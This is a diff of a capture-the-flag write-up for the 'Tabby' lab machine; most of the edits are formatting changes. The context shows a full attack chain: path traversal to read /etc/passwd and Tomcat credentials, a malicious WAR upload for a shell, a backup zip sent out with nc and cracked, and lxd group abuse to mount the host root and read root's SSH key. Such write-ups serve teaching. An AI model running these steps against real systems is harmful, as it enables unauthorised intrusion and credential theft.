@@ -1,11 +1,7 @@
 ![](tabby-banner.png)
 
-<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="http://www.hackthebox.eu/badge/image/391067"></img></a>
+<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></img></a>
 </p>
-
-||
-|-----------|
-|Start with the nmap found web_server on port 80 and tomcat on port 8080. form web_server found a hostname and a __local file inclusion__ vulnerability. After enumerate tomcat and user lfi to get tomcat admin creds and after uploading malicious war file on the server get shell on the box as user tomcat. There is a password protected zip file which password worked for user ash and from the user ash get the __User_flag__. user ash is in __lxd__ ground which helps to esclate to root user and get the __Root_flag__.|
 
 # Scanning
 
@@ -40,17 +36,17 @@ PORT     STATE SERVICE VERSION
 		  http://megahosting.htb/news.php?file=statement
 	
 * from that link, it seems `statement`is a filename passed as input to the parameter `file`of the page `news.php`.
-* __LFI__ test on the `news.php`
+* **LFI** test on the `news.php`
 * try to view `/etc/passd` to test `LFI`
 
-* __URL: __`http://megahosting.htb/news.php?file=../../../../etc/passwd`
+* **URL: **`http://megahosting.htb/news.php?file=../../../../etc/passwd`
 	returns the `/etc/passwd` file
 	
 	  root:x:0:0:root:/root:/bin/bash
 	  ...
 	  ash:x:1000:1000:clive:/home/ash:/bin/bash
 	  
-	this verifies the __LFI vulnerability__
+	this verifies the **LFI vulnerability**
 
 ### Local File Inclusion (LFI)
 
@@ -111,13 +107,13 @@ tomcat:$3cureP4s5w0rd123!
 ### host-manager
 
 * using `tomcat:$3cureP4s5w0rd123!` login successful.
-* there is __noting__ and can't upload war file from here
+* there is **noting** and can't upload war file from here
 
 ### war file
 
 * The tomcat user also have another role `roles="manager-script"`.
 
-    * __manager-script__ is allow access to the text-based web service located at /manager/text.
+    * **manager-script** is allow access to the text-based web service located at /manager/text.
     * that means user `tomcat` can access to `manager` in test based
     * that means i can still upload war file from text based manager
     
@@ -151,7 +147,7 @@ OK - Deployed application at context path [/shell]
 
 # user escalation
 
-* __Shell Upgrade__
+* **Shell Upgrade**
 
  	  id 
  	  uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
@@ -172,12 +168,12 @@ OK - Deployed application at context path [/shell]
 	  tomcat@tabby:/var/www/html/files$ ls -lsh
 	   12K -rw-r--r-- 1 ash  ash  8.6K Jun 16 13:42 16162020_backup.zip                           
 
-* __Load backup file in my local machine__
+* **Load backup file in my local machine**
 
 	  tomcat@tabby:var/www/html/files$ nc -w 4 10.10.15.151 4242 < 16162020_backup.zip
 	  rj@whoisrj:~$ nc -nvlp 4242 > 16162020_backup.zip
 	    
-* __crack zip using fcrackzip__
+* **crack zip using fcrackzip**
 
 	`fcrackzip 16162020_backup.zip -v -uDp /usr/share/wordlists/rockyou.txt`
 	  
@@ -214,16 +210,16 @@ uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev
 
 ## lxd/lxc
 
-__LXD__ is a next generation system container manager. It offers a user experience similar to virtual machines but using Linux containers instead.
+**LXD** is a next generation system container manager. It offers a user experience similar to virtual machines but using Linux containers instead.
 
 * LXD isn't a rewrite of LXC, in fact it's building on top of LXC to provide a new, better user experience. Under the hood, LXD uses LXC through liblxc and its Go binding to create and manage the containers.
 It's basically an alternative to LXC's tools and distribution template system with the added features that come from being controllable over the network.
 
-__Learn from [here](https://linuxcontainers.org/lxd/introduction/)__
+**Learn from [here](https://linuxcontainers.org/lxd/introduction/)**
 
 ## lxd Privilege Escalation
 
-* LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket. One of them is to use the __LXD API__ to __mount the host’s root filesystem into a container.__ 
+* LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket. One of them is to use the **LXD API** to **mount the host’s root filesystem into a container.** 
 
 * as user `ash` is in `lxd` group, user can load a lxd container and after that user can mount host's root filesystem inside the container and can access in host's root filesystem from the container.
 
@@ -243,22 +239,22 @@ one form [hackingarticles.in](https://www.hackingarticles.in/lxd-privilege-escal
 another form [MONOC.com](https://blog.m0noc.com/2018/10/lxc-container-privilege-escalation-in.html?m=1)
 
 *i use frist one*
-* __create container image,__
-    * for container image i use __Alpine image__ because it is a light weight linux image that become handy in image uploading.
-        * i found a __lxd-alpine-builder__ script from github user [saghul](https://github.com/saghul/lxd-alpine-builder.git)
+* **create container image,**
+    * for container image i use **Alpine image** because it is a light weight linux image that become handy in image uploading.
+        * i found a **lxd-alpine-builder** script from github user [saghul](https://github.com/saghul/lxd-alpine-builder.git)
     * use that script to build a alpine image
     	* there is a another github tool that create lxc containers from lxc images yaml files
 	    	* [distrobuilder](https://github.com/lxc/distrobuilder)
 	    	* images yaml files found [here](https://github.com/lxc/lxc-ci/tree/master/images)
 	
-* __upload that image in the host.__
-* __import in lxc and configure that image,__
-* __mount root filesystem.__
-* __run container instance.__
+* **upload that image in the host.**
+* **import in lxc and configure that image,**
+* **mount root filesystem.**
+* **run container instance.**
 
 # Root Privesc
 
-__Frist__, create a alpine image , it takes some time to download all packages
+**Frist**, create a alpine image , it takes some time to download all packages
 
 `./build-alpine`
 
@@ -271,7 +267,7 @@ after downloading completed a single tar file generated
 
 	3.1M -rw-r--r-- 1 rj rj 3.1M Sep 14 15:25 alpine-v3.12-x86_64-20200914_1025.tar.gz
 
-__Second__, upload using `wget`
+**Second**, upload using `wget`
 
 	ash@tabby:~$ wget 10.10.15.151/alpine-v3.12-x86_64-20200914_1025.tar.gz
 	...
@@ -281,7 +277,7 @@ __Second__, upload using `wget`
 	-rw-rw-r-- 1 ash ash 3221262 Sep 14 14:25 alpine-v3.12-x86_64-20200914_1025.tar.gz
 
 
-__Third__, import and configure the image into lxc
+**Third**, import and configure the image into lxc
 
 	ash@tabby:~$ lxc image import ./alpine-v3.12-x86_64-20200914_1025.tar.gz --alias ANYTHING
 	ash@tabby:~$ lxc init ANYTHING pwned -c security.privileged=true
@@ -294,13 +290,13 @@ __Third__, import and configure the image into lxc
 	+-------+---------+------+------+-----------+-----------+
 	ash@tabby:~$
 	
-__Forth__, mount host filesystem
+**Forth**, mount host filesystem
 
 	ash@tabby:~$ lxc config device add pwned mydevice disk source=/ path=/mnt/root recursive=true
 	Device mydevice added to pwned
 	ash@tabby:~$
 	
-__Fifth__, run image
+**Fifth**, run image
 
 	ash@tabby:~$ lxc start pwned
 	ash@tabby:~$ lxc exec pwned /bin/sh
@@ -313,7 +309,7 @@ __Fifth__, run image
 	/mnt/root/root/.ssh # ls -la id_rsa
 	-rw-------    1 root     root          2602 Jun 16 14:00 id_rsa
 
-__Extra__, get ssh shell
+**Extra**, get ssh shell
 
 `chmod 600 id_rsa`
 	
